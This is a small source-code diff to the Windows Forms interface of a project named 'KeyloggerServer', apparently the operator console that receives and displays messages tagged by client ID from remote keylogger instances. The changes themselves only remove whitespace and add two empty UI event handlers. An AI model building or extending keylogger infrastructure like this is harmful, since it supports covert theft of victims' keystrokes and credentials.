@@ -65,7 +65,7 @@ namespace KeyloggerServer
                         int end = message.IndexOf(']');
                         string clientId = message.Substring(1, end - 1);
                         string content = message.Substring(end + 1);
-                       
+
 
                         if (clientId == currentlySelectedClientId)
                             AppendMessage(content);
@@ -176,5 +176,14 @@ namespace KeyloggerServer
             }
         }
 
+        private void toolStripLabel1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
     }
 }
